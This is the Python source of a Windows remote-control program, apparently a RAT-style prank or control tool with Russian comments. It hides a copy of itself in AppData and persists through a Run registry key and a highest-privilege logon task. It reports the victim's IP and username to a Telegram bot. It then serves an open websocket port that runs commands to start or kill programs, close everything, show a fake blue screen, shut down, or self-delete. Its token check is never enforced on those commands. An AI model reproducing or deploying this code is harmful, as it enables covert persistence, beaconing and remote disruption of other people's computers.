import asyncio
import ctypes
import shutil
import subprocess
import sys
import threading
import tkinter
import requests

import psutil
import websockets
import json
import socket
import platform
import os
import GPUtil
import winreg
import time

from websockets.exceptions import ConnectionClosed
from tkinter import messagebox

from screeninfo import get_monitors

from config import BOT_TOKEN, CHAT_ID, WS_AUTH_TOKEN


class ClientWebsocketServer:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.clients = set()

        self.installed_programs_cache = None
        self.cache_time = 0
        self.cache_time_value = 300

        self.last_activity_time = time.time()
        self.is_sleep_monitoring = False
        self.sleep_monitor_thread = None
        self.wake_up_timer = None
        self.scheduled_wake_time = None

        self.is_startup_mode = len(sys.argv) > 1 and sys.argv[1] == "--startup"

        if not self.is_startup_mode:
            self.auto_setup()

        self.start_sleep_monitoring()

        self.loop = None

    # --- АВТОЗАГРУЗКА ИЗ СНА ---
    def start_sleep_monitoring(self):
        def monitor():
            last_cpu = psutil.cpu_percent()
            last_network = psutil.net_io_counters().bytes_sent

            while True:
                try:
                    time.sleep(30)

                    current_cpu = psutil.cpu_percent(interval=1)
                    current_network = psutil.net_io_counters().bytes_sent

                    cpu_change = abs(current_cpu - last_cpu)
                    network_change = current_network - last_network

                    if cpu_change > 20 or network_change > 100000:
                        self.on_wake_from_sleep()

                    last_cpu = current_cpu
                    last_network = current_network

                except Exception:
                    time.sleep(60)

        self.sleep_monitor_thread = threading.Thread(target=monitor, daemon=True)
        self.sleep_monitor_thread.start()

    def on_wake_from_sleep(self):
        try:
            self.installed_programs_cache = None
            self.cache_time = 0

            wake_message = {
                'status': 'success',
                'type': 'system_wake',
                'data': '✅ Компьютер вышел из сна'
            }

            if self.loop and self.loop.is_running():
                asyncio.run_coroutine_threadsafe(
                    self.broadcast_to_all(wake_message),
                    self.loop
                )

        except Exception as e:
            print(f"❌ Ошибка при выходе из сна: {e}")

    def is_server_running(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((self.host, self.port))
            sock.close()
            return result == 0
        except:
            return False

    # --- АВТОЗАГРУЗКА ---
    def copy_self_to_system(self):
        try:
            if not getattr(sys, 'frozen', False):
                return None

            current_exe = sys.executable
            exe_name = os.path.basename(current_exe)

            app_name = os.path.splitext(exe_name)[0]
            system_folder = os.path.join(os.environ['APPDATA'], app_name)
            os.makedirs(system_folder, exist_ok=True)

            target_exe = os.path.join(system_folder, exe_name)

            if not os.path.exists(target_exe) or \
                    os.path.getsize(current_exe) != os.path.getsize(target_exe) or \
                    os.path.getmtime(current_exe) > os.path.getmtime(target_exe):

                shutil.copy2(current_exe, target_exe)

                try:
                    subprocess.run(f'attrib +h "{system_folder}"', shell=True, capture_output=True)
                except:
                    pass

            return target_exe

        except Exception as e:
            return None

    def add_to_startup(self, exe_path):
        try:
            app_name = os.path.splitext(os.path.basename(exe_path))[0]

            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"

            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, app_name, 0, winreg.REG_SZ, f'"{exe_path}" --startup')
                return True

        except Exception as e:
            return False

    def create_scheduled_task(self, exe_path):
        try:
            app_name = os.path.splitext(os.path.basename(exe_path))[0]

            subprocess.run(f'schtasks /delete /tn "{app_name}" /f',
                           shell=True, capture_output=True)

            task_cmd = (
                f'schtasks /create /tn "{app_name}" /tr "{exe_path} --startup" '
                f'/sc onlogon /delay 0000:30 /rl highest /f'
            )

            result = subprocess.run(task_cmd, shell=True, capture_output=True, text=True)

            if result.returncode == 0:
                return True
            else:
                return False

        except Exception as e:
            return False

    def auto_setup(self):
        try:
            if self.is_already_installed():
                return

            system_exe_path = self.copy_self_to_system()
            if not system_exe_path:
                return

            task_success = self.create_scheduled_task(system_exe_path)
            reg_success = self.add_to_startup(system_exe_path)

            if task_success or reg_success:
                self.response_to_telegram()

                try:
                    subprocess.Popen([system_exe_path, "--startup"])
                    time.sleep(2)
                    sys.exit(0)
                except Exception as e:
                    print(f"⚠️ Не удалось запустить копию: {e}")

        except Exception as e:
            print(f"❌ Ошибка автозагрузки: {e}")

    def is_already_installed(self):
        try:
            current_exe = sys.executable
            app_name = os.path.splitext(os.path.basename(current_exe))[0]

            try:
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"

                with winreg.OpenKey(key, subkey, 0, winreg.KEY_READ) as reg_key:
                    try:
                        value, _ = winreg.QueryValueEx(reg_key, app_name)
                        if value and os.path.exists(value.split(' ')[0].strip('"')):
                            return True
                    except FileNotFoundError:
                        pass
            except:
                pass

            # Проверяем планировщик задач
            try:
                result = subprocess.run(
                    f'schtasks /query /tn "{app_name}"',
                    shell=True, capture_output=True, text=True
                )
                return result.returncode == 0
            except:
                pass

            return False

        except Exception as e:
            print(f"❌ Ошибка проверки установки: {e}")
            return False

    def remove_server_program(self):
        try:
            current_exe = sys.executable
            app_name = os.path.splitext(os.path.basename(current_exe))[0]

            try:
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"

                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as reg_key:
                    try:
                        winreg.DeleteValue(reg_key, app_name)
                    except FileNotFoundError:
                        pass
            except Exception as e:
                print(f"⚠️ Ошибка удаления из реестра: {e}")

            try:
                result = subprocess.run(
                    f'schtasks /delete /tn "{app_name}" /f',
                    shell=True, capture_output=True, text=True
                )

            except Exception as e:
                print(f"⚠️ Ошибка удаления из планировщика: {e}")

            system_folder = os.path.join(os.environ['APPDATA'], app_name)
            if os.path.exists(system_folder):
                try:
                    bat_content = f"""
                    @echo off
                    chcp 65001 >nul
                    timeout /t 2 /nobreak >nul
                    taskkill /f /im "{os.path.basename(current_exe)}" >nul 2>&1
                    rmdir /s /q "{system_folder}" >nul 2>&1
                    del "%~f0" >nul 2>&1
                    """

                    bat_path = os.path.join(os.environ['TEMP'], f'remove_{app_name}.bat')
                    with open(bat_path, 'w', encoding='utf-8') as f:
                        f.write(bat_content)

                    subprocess.Popen([bat_path], shell=True,
                                     stdin=subprocess.DEVNULL,
                                     stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL)

                    time.sleep(1)
                    sys.exit(0)

                except Exception as e:
                    return f"❌ Ошибка удаления: {e}"

            return "✅ Программа полностью удалена"

        except Exception as e:
            return f"❌ Ошибка удаления: {e}"

    # --- НАСТРОЙКА WEBSOCKET-СЕРВЕРА ---
    # подключение нового пользователя к серверу
    async def handler(self, websocket):
        self.clients.add(websocket)
        print(f'✅ Новое подключение: {websocket.remote_address}')

        response = {
            'status': 'success',
            'type': 'system_active',
            'data': '✅ Сервер готов к работе'
        }
        await websocket.send(json.dumps(response))

        try:
            async for message in websocket:
                try:
                    data = json.loads(message)
                    command = data.get('command')

                    if not command:
                        await websocket.send(json.dumps({
                            'status': 'error',
                            'message': 'No command provided'
                        }))
                        continue

                    response = await self.process_command(command, data)
                    await websocket.send(json.dumps(response))

                except json.JSONDecodeError:
                    await websocket.send(json.dumps({
                        'status': 'error',
                        'message': 'Invalid JSON'
                    }))

        except ConnectionClosed:
            print('Клиент отключился')
        except Exception as e:
            print(f'Ошибка в handler: {e}')
        finally:
            self.clients.discard(websocket)

    # обработка полученной команды
    async def process_command(self, command, data):
        if command == 'auth':
            return self.verify_token(data.get('data'))

        if command == 'ping':
            return {
                'status': 'success',
                'type': 'pong',
                'data': 'pong'
            }
        elif command == 'get_system_info':
            return {
                'status': 'success',
                'type': 'get_system_info',
                'data': self.get_system_info(),
            }
        elif command == 'get_system_resources':
            resources = self.get_system_resources()
            return {
                'status': 'success',
                'type': 'get_system_resources',
                'data': '\n'.join(resources) if isinstance(resources, list) else resources,
            }
        elif command == 'get_running_programs':
            programs = self.get_running_programs()
            if isinstance(programs, dict):
                programs_list = [f"{name} (PID: {pid})" for name, pid in programs.items()]
                return {
                    'status': 'success',
                    'type': 'get_running_programs',
                    'data': 'RUNNING PROGRAMS:\n' + '\n'.join(programs_list),
                }
            else:
                return {
                    'status': 'success',
                    'type': 'get_running_programs',
                    'data': f'RUNNING PROGRAMS:\n{programs}',
                }
        elif command == 'find_installed_programs':
            programs = self.find_installed_programs()
            if isinstance(programs, dict):
                programs_list = [f"{name}" for name in programs.keys()]
                return {
                    'status': 'success',
                    'type': 'find_installed_programs',
                    'data': 'INSTALLED PROGRAMS:\n' + '\n'.join(programs_list),
                }
            else:
                return {
                    'status': 'success',
                    'type': 'find_installed_programs',
                    'data': f'INSTALLED PROGRAMS:\n{programs}',
                }
        elif command == 'start_program':
            return {
                'status': 'success',
                'type': 'start_program',
                'data': self.start_program(data),
            }
        elif command == 'kill_program':
            return {
                'status': 'success',
                'type': 'kill_program',
                'data': self.kill_program(data),
            }
        elif command == 'show_custom_message':
            return {
                'status': 'success',
                'type': 'show_custom_message',
                'data': self.show_modal_window(data['data']),
            }
        elif command == 'show_blue_screen':
            return {
                'status': 'success',
                'type': 'show_blue_screen',
                'data': self.show_blue_screen(data['data']),
            }
        elif command == 'system_sleep':
            return {
                'status': 'success',
                'type': 'system_sleep',
                'data': await self.system_sleep(),
            }
        elif command == 'system_shutdown':
            return {
                'status': 'success',
                'type': 'system_shutdown',
                'data': self.system_shutdown(),
            }
        elif command == 'close_all_programs':
            return {
                'status': 'success',
                'type': 'close_all_programs',
                'data': self.close_all_programs(),
            }
        elif command == 'remove_program':
            return {
                'status': 'success',
                'type': 'remove_program',
                'data': self.remove_server_program(),
            }
        else:
            return {
                'status': 'error',
                'type': 'error',
                'data': 'Неизвестная команда..',
            }

    async def start_server(self):
        print(f'Запуск сервера на ws://{self.host}:{self.port}')

        self.loop = asyncio.get_running_loop()

        async with websockets.serve(self.handler, self.host, self.port):
            print('Сервер запущен')

            await asyncio.Future()

    def start(self):
        asyncio.run(self.start_server())

    # --- ВСПОМОГАТЕЛЬНЫЕ МЕТОДЫ
    # поднятие окна на самый верх
    def force_window_to_top(self, hwnd):
        try:
            ctypes.windll.user32.ShowWindow(hwnd, 9)
            ctypes.windll.user32.SetWindowPos(hwnd, -1, 0, 0, 0, 0, 0x0002 | 0x0001)
            ctypes.windll.user32.SetForegroundWindow(hwnd)
        except Exception as e:
            print(f"Window focus error: {e}")

    # получаем количество мониторов
    def get_all_monitors(self):
        monitors = get_monitors()
        return [(m.x, m.y, m.width, m.height) for m in monitors]

    # получаем ip-адрес для тг-бота
    def get_ip(self):
        try:
            result = subprocess.run(
                ['ipconfig'],
                capture_output=True,
                text=True,
                encoding='cp866',
            )

            if result.returncode != 0:
                return

            ip_info_arr = result.stdout.split('\n')

            for line in ip_info_arr:
                if 'IPv4' in line and ' : ' in line:
                    arr = line.split(' : ')

                    if len(arr) > 1:
                        return arr[1].strip()

        except (UnicodeDecodeError, subprocess.SubprocessError, FileNotFoundError):
            pass

    # отправка данных в тг-бота
    def response_to_telegram(self):
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

            message = f"🌐 <b>Запуск программы</b>\n\n" \
                      f"🔗 <b>IP-адрес:</b> <code>{self.get_ip()}</code>\n\n" \
                      f"👤 <b>Пользователь:</b> <code>{os.getlogin()}</code>"
            data = {
                'chat_id': CHAT_ID,
                'text': message,
                'parse_mode': 'HTML',
            }

            requests.post(url, data=data, timeout=10)

        except requests.exceptions.RequestException:
            pass

    # отправка сообщения всем пользователям
    async def broadcast_to_all(self, message):
        if not self.clients:
            return

        disconnected_clients = []

        for websocket in self.clients.copy():
            try:
                await websocket.send(json.dumps(message))
            except Exception as e:
                disconnected_clients.append(websocket)

        for websocket in disconnected_clients:
            self.clients.discard(websocket)

    # --- ФУНКЦИИ-КОМАНДЫ ---
    # аутентификация
    def verify_token(self, received_token):
        check = received_token == WS_AUTH_TOKEN

        if check:
            return {
                'status': 'success',
                'type': 'auth_result',
                'data': 'Аутентификация прошла успешно!!'
            }
        else:
            return {
                'status': 'error',
                'type': 'auth_result',
                'data': 'Невалидный токен!!'
            }

    # получение информации о ПК
    def get_system_info(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_name = s.getsockname()[0]
            s.close()

        except Exception:
            ip_name = '127.0.0.1'

        return '\n'.join([
            f"💻 Система: {platform.system()} {platform.release()}",
            f"👤 Пользователь: {os.getlogin()}",
            f"🌐 IP-адрес: {ip_name}",
            f"⚡ Кол-во ядер: {psutil.cpu_count()}",
            f"💾 ОЗУ: {round(psutil.virtual_memory().total / (1024 ** 3), 1)} Гб",
        ])

    # получение состояния ПК
    def get_system_resources(self):
        try:
            system_info = []

            # ЦП
            cpu = psutil.cpu_percent(interval=1)
            system_info.append(f"⚡ ЦП: {cpu}%")

            # ОЗУ
            memory = psutil.virtual_memory()
            all_memory = round(memory.total / (1024 ** 3), 1)
            used_memory = round(memory.used / (1024 ** 3), 1)
            system_info.append(f"💾 ОЗУ: {used_memory}Гб / {all_memory}Гб")

            # Видеокарта
            try:
                gpu_info = GPUtil.getGPUs()
                if gpu_info:
                    gpu = gpu_info[0]

                    system_info.extend([
                        f"🎮 Видеокарта: {gpu.name}",
                        f"🔥 Загрузка GPU: {gpu.load * 100:.1f}%",
                        f"💾 Видеопамяти: {gpu.memoryUsed}MB / {gpu.memoryTotal}MB",
                    ])
                else:
                    system_info.append("🎮 Видеокарта: не найдена")
            except Exception as e:
                system_info.append(f"🎮 Ошибка получения информации о GPU: {str(e)}")

            # диски
            disks_info = []
            for partition in psutil.disk_partitions():
                try:
                    if 'cdrom' in partition.opts or partition.fstype == '':
                        continue

                    usage = psutil.disk_usage(partition.mountpoint)

                    total_gb = round(usage.total / (1024 ** 3), 1)
                    used_gb = round(usage.used / (1024 ** 3), 1)

                    disks_info.append(f"  💾 {partition.device}: {used_gb}GB/{total_gb}GB")
                except PermissionError:
                    continue

            if disks_info:
                system_info.append("📁 ДИСКИ:")
                system_info.extend(disks_info)
            else:
                system_info.append("📁 Диски: не найдены")

            return system_info


        except Exception:
            return "Не удалось получить информацию о состоянии ПК"

    # получение запущенных программ
    def get_running_programs(self):
        try:
            running_programs = {}

            # системные процессы, которые можно пропустить
            system_processes = {
                'system', 'svchost', 'runtimebroker', 'dllhost', 'conhost',
                'services', 'lsass', 'winlogon', 'csrss', 'smss', 'taskhostw',
                'explorer', 'taskmgr', 'cmd', 'powershell', 'python', 'py'
            }

            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    username = proc.info.get('username', '')
                    proc_name = proc.info['name'].lower().replace('.exe', '')

                    if username and ('SYSTEM' in username or 'AUTHORITY' in username):
                        continue

                    if proc_name in system_processes:
                        continue

                    display_name = proc_name.capitalize()

                    running_programs[display_name] = proc.info['pid']

                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass

            return running_programs
        except Exception as e:
            print('что-то пошло не так..', e)

    # все установленные программы
    def find_installed_programs(self):
        current_time = time.time()

        if (
                self.installed_programs_cache is not None
                and current_time - self.cache_time < self.cache_time_value
        ):
            return self.installed_programs_cache

        installed_programs = {}

        registry_paths = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        ]

        for reg, path in registry_paths:
            try:
                key = winreg.OpenKey(reg, path)

                num_sub_keys = winreg.QueryInfoKey(key)[0]

                for i in range(num_sub_keys):
                    sub_key_name = winreg.EnumKey(key, i)

                    try:
                        with winreg.OpenKey(key, sub_key_name) as program_key:
                            display_name = winreg.QueryValueEx(program_key, "DisplayName")[0]

                            if display_name is None:
                                continue

                            exe_path = ''
                            try:
                                exe_path = winreg.QueryValueEx(program_key, 'DisplayIcon')[0]

                                if exe_path and ',' in exe_path:
                                    exe_path = exe_path.split(',')[0]

                            except:
                                pass

                            if not exe_path:
                                try:
                                    install_location = winreg.QueryValueEx(program_key, "InstallLocation")[0]

                                    if install_location and os.path.exists(install_location):
                                        for file in os.listdir(install_location):
                                            if file.endswith('.exe') and not file.lower().startswith('unins'):
                                                exe_path = os.path.join(install_location, file)
                                                break

                                except:
                                    pass

                            if display_name and exe_path and os.path.exists(exe_path):
                                installed_programs[display_name] = exe_path

                    except FileNotFoundError:
                        display_name = None

                winreg.CloseKey(key)

            except FileNotFoundError:
                continue
            except PermissionError:
                continue

        self.installed_programs_cache = installed_programs
        self.cache_time = current_time

        return installed_programs

    # запуск программы по имени
    def start_program(self, search_name):
        search_name = search_name if isinstance(search_name, str) else search_name.get('data', '')

        programs = self.find_installed_programs()

        found_programs = []

        for program_name, exe_path in programs.items():
            if search_name.lower() in program_name.lower() and os.path.exists(exe_path):
                found_programs.append([program_name, exe_path])

        if not found_programs:
            return f"❌ Программа '{search_name}' не найдена"

        program_name, exe_path = found_programs[0]

        try:
            subprocess.Popen([exe_path])
            return f"✅ Запущено: {program_name}"

        except Exception as e:
            return f"❌ Ошибка запуска {program_name}: {e}"

    # закрытие программы по имени
    def kill_program(self, search_name):
        search_name = search_name if isinstance(search_name, str) else search_name.get('data', '')

        running_programs = self.get_running_programs()

        found_processes = []

        if search_name.isdigit():
            pid = int(search_name)

            try:
                process = psutil.Process(pid)
                proc_name = process.name()
                found_processes.append((proc_name, pid))

            except psutil.NoSuchProcess:
                pass

        for program_name, pid in running_programs.items():
            if search_name.lower() in program_name.lower():
                found_processes.append([program_name, pid])

        if not found_processes and not search_name.isdigit():
            return f"❌ Процесс '{search_name}' не найден"

        killed = []
        for proc_name, pid in found_processes:
            try:
                process = psutil.Process(pid)
                process.terminate()
                time.sleep(2)

                if process.is_running():
                    process.kill()
                    killed.append(f"{proc_name} (принудительно)")
                else:
                    killed.append(f"{proc_name} (корректно)")

            except Exception as e:
                killed.append(f"{proc_name} (ошибка: {e})")

        if len(killed) == 1:
            return f"✅ Завершен: {killed[0]}"
        else:
            return f"✅ Завершено процессов: {', '.join(killed)}"

    # показ модального окна
    def show_modal_window(self, message_data):
        try:
            message_type = message_data.get('type', 'info')
            message_text = message_data.get('text', '...')

            def create_message():
                try:
                    root = tkinter.Tk()
                    root.withdraw()
                    root.attributes('-topmost', True)

                    if message_type == 'error':
                        messagebox.showerror('Ошибка', message_text, parent=root)
                    elif message_type == 'warning':
                        messagebox.showwarning('Предупреждение', message_text, parent=root)
                    else:
                        messagebox.showinfo('Информация', message_text, parent=root)

                    def force_topmost():
                        try:
                            hwnd = ctypes.windll.user32.GetForegroundWindow()
                            self.force_window_to_top(hwnd)
                        except:
                            pass

                    for i in range(5):
                        root.after(100 * i, force_topmost)

                    root.destroy()

                except:
                    pass

            message_thread = threading.Thread(target=create_message)
            message_thread.daemon = True
            message_thread.start()

            return "Модальное окно активировано"

        except:
            pass

    # показ синего экрана
    def show_blue_screen(self, message_data=None):
        try:
            def create_bsod():
                try:
                    monitors = self.get_all_monitors()
                    windows = []

                    def close_on_right_click(event):
                        if event.num == 3:
                            for window in windows:
                                try:
                                    window.destroy()
                                except:
                                    pass

                    for x, y, width, height in monitors:
                        root = tkinter.Tk()
                        root.title(f'Windows - System Error')

                        root.geometry(f"{width}x{height}+{x}+{y}")
                        root.attributes('-fullscreen', True)
                        root.attributes('-topmost', True)
                        root.configure(bg='#0078D7')

                        root.bind('<Button-3>', close_on_right_click)

                        message = message_data or "A problem has been detected and Windows has been shut down to prevent damage to your computer."

                        text_frame = tkinter.Frame(root, bg='#0078D7')
                        text_frame.pack(expand=True, fill='both', padx=100, pady=150)

                        title_label = tkinter.Label(
                            text_frame,
                            text="Your PC ran into a problem and needs to restart.",
                            font=("Lucida Console", 20, "bold"),
                            fg="white",
                            bg="#0078D7",
                            justify='left'
                        )
                        title_label.pack(anchor='w', pady=(0, 30))

                        message_label = tkinter.Label(
                            text_frame,
                            text=message,
                            font=("Lucida Console", 14),
                            fg="white",
                            bg="#0078D7",
                            justify='left',
                            wraplength=width - 200
                        )
                        message_label.pack(anchor='w', pady=(0, 50))

                        progress_label = tkinter.Label(
                            text_frame,
                            text="We're just collecting some error info, and then we'll restart for you.",
                            font=("Lucida Console", 12),
                            fg="white",
                            bg="#0078D7",
                            justify='left'
                        )
                        progress_label.pack(anchor='w', pady=(0, 20))

                        progress_percent = tkinter.Label(
                            text_frame,
                            text="0% complete",
                            font=("Lucida Console", 12),
                            fg="white",
                            bg="#0078D7",
                            justify='left'
                        )
                        progress_percent.pack(anchor='w')

                        hint_label = tkinter.Label(
                            root,
                            text="Close: Right Click",
                            font=("Arial", 8),
                            fg="#0078D7",
                            bg="#0078D7"
                        )
                        hint_label.place(relx=0.99, rely=0.99, anchor='se')

                        def update_percent(percent=0):
                            if percent <= 100:
                                progress_percent.config(text=f"{percent}% complete")
                                root.after(100, update_percent, percent + 1)

                        root.after(100, lambda: self.force_window_to_top(root.winfo_id()))
                        root.after(500, update_percent)

                        root.focus_force()
                        root.grab_set()

                        windows.append(root)

                    if windows:
                        windows[0].mainloop()

                except:
                    pass

            bsod_thread = threading.Thread(target=create_bsod)
            bsod_thread.daemon = True
            bsod_thread.start()

            return "Синий экран активирован"

        except:
            pass

    # отправка в сон
    async def system_sleep(self):
        try:
            response = {
                'status': 'success',
                'type': 'system_sleep',
                'data': "✅ Система переходит в спящий режим через 3 секунды..."
            }

            def execute_sleep():
                time.sleep(3)
                try:
                    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
                except Exception:
                    pass

            sleep_thread = threading.Thread(target=execute_sleep)
            sleep_thread.daemon = True
            sleep_thread.start()

            return response

        except Exception as e:
            return {
                'status': 'error',
                'type': 'system_sleep',
                'data': f"❌ Ошибка перехода в спящий режим: {e}"
            }

    def system_shutdown(self):
        try:
            os.system("shutdown /s /t 5")
            return "Система выключится через 5 секунд.."
        except Exception as e:
            return f"Ошибка выключения системы: {e}"

    def close_all_programs(self):
        try:
            closed_count = 0
            error_count = 0

            for proc in psutil.process_iter(['pid', 'name', 'username']):
                try:
                    username = proc.info.get('username', '')
                    proc_name = proc.info['name'].lower()

                    system_processes = {
                        'explorer', 'taskmgr', 'cmd', 'powershell', 'python', 'py',
                        'system', 'svchost', 'winlogon', 'csrss', 'lsass', 'services',
                        'wininit', 'dwm', 'ctfmon', 'searchui', 'runtimebroker'
                    }

                    if (username and not ('SYSTEM' in username or 'AUTHORITY' in username) and
                            proc_name not in system_processes and
                            proc.pid != os.getpid()):

                        proc.terminate()
                        time.sleep(0.1)
                        if proc.is_running():
                            proc.kill()

                        closed_count += 1

                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    error_count += 1
                    continue

            return f"✅ Закрыто {closed_count} программ (ошибок: {error_count})"

        except Exception as e:
            return f"❌ Ошибка закрытия всех программ: {str(e)}"


if __name__ == "__main__":
    server = ClientWebsocketServer()
    server.start()
